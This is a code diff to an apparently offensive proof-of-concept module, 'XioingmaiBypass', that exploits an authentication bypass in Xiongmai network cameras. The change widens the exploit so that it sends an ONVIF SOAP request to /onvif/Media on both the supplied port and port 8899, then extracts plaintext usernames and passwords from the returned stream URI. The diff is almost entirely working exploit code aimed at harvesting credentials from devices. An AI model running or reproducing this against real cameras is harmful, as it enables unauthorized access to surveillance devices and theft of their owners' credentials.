@@ -17,8 +17,6 @@ class XioingmaiBypass(POCTemplate):
         self.desc = 'Xiongmai authentication bypass'
 
     def verify(self, ip, port=80):
-        headers = {'User-Agent': self.config.user_agent}
-        url = f"http://{ip}:8899/onvif/Media"
         headers = {
             "Content-Type": "application/soap+xml; charset=utf-8",
             "Accept-Encoding": "gzip",
@@ -44,16 +42,25 @@ class XioingmaiBypass(POCTemplate):
             </soap:Body>
         </soap:Envelope>
         """
-        try:
-            r = self.session.post(url, headers=headers, data=xml_payload, verify=False, timeout=self.config.timeout)
-            if match := re.search(r'<tt:Uri>(.*?)</tt:Uri>', r.text):
-                link = match.group(1).replace("&amp;", "&")
-                user = re.findall('user=(.*)&', link)
-                password = re.findall('password=(.*)', link)
-                if user and password:
-                    return ip, str(port), self.product, user[0], password[0], self.name
-        except Exception as e:
-            logger.error(e)
+        # ONVIF is often on 8899 even when the web UI is on another port
+        seen = set()
+        for p in (port, 8899):
+            if p in seen:
+                continue
+            seen.add(p)
+            try:
+                r = self.session.post(
+                    f"http://{ip}:{p}/onvif/Media",
+                    headers=headers, data=xml_payload,
+                    verify=False, timeout=self.config.timeout)
+                if match := re.search(r'<tt:Uri>(.*?)</tt:Uri>', r.text):
+                    link = match.group(1).replace("&amp;", "&")
+                    user = re.findall('user=(.*)&', link)
+                    password = re.findall('password=(.*)', link)
+                    if user and password:
+                        return ip, str(port), self.product, user[0], password[0], self.name
+            except Exception as e:
+                logger.error(e)
         return None
 
     def exploit(self, results):
